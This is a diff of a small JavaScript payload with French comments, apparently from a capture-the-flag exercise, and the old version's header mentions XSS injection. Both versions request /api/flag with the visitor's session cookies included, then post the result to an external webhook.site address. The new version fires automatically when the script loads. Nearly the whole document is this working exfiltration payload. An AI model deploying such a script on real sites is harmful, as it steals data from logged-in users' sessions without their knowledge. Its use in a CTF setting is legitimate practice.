@@ -1,32 +1,36 @@
-// lol.js - Script qui exécute la récupération du flag et l'envoie à un webhook
-
-(function() {
-    // Code de l'injection XSS ou toute autre logique que tu souhaites conserver
-
-    // Récupération du flag via une requête GET vers /api/flag
+// Cette fonction récupère le flag via une requête API GET
+function fetchAndSendFlag() {
     fetch('/api/flag', {
         method: 'GET',
-        credentials: 'include', // Permet d'inclure les cookies d'authentification si nécessaire
+        credentials: 'include',  // Cela permet d'inclure les cookies de session si nécessaire
     })
-    .then(response => response.json()) // Convertir la réponse en JSON
+    .then(response => response.json())
     .then(data => {
-        // Si le flag est récupéré, on l'envoie à ton webhook
-        fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json', // Envoi des données en JSON
-            },
-            body: JSON.stringify({ flag: data.flag }) // Envoi du flag dans le body de la requête
-        })
-        .then(res => res.json()) // Parse la réponse du webhook
-        .then(resData => {
-            console.log('Webhook response:', resData); // Affiche la réponse du webhook dans la console
-        })
-        .catch(error => {
-            console.error('Erreur lors de l\'envoi au webhook:', error); // Gère les erreurs d'envoi au webhook
-        });
+        // Assurez-vous que la réponse contient bien un 'flag'
+        if (data && data.flag) {
+            // Envoie le flag à un webhook pour le récupérer à distance
+            fetch('https://webhook.site/2e771e56-2d9f-482a-91af-24b27aa9fb2c', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ flag: data.flag })  // Envoie le flag au webhook
+            })
+            .then(res => res.json())
+            .then(resData => {
+                console.log('Réponse du webhook:', resData);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi au webhook:', error);
+            });
+        } else {
+            console.error('Flag introuvable dans la réponse.');
+        }
     })
     .catch(error => {
-        console.error('Erreur lors de la récupération du flag:', error); // Gère les erreurs de récupération du flag
+        console.error('Erreur lors de la récupération du flag:', error);
     });
-})();
+}
+
+// Lorsque le script se charge, récupérer et envoyer le flag
+fetchAndSendFlag();
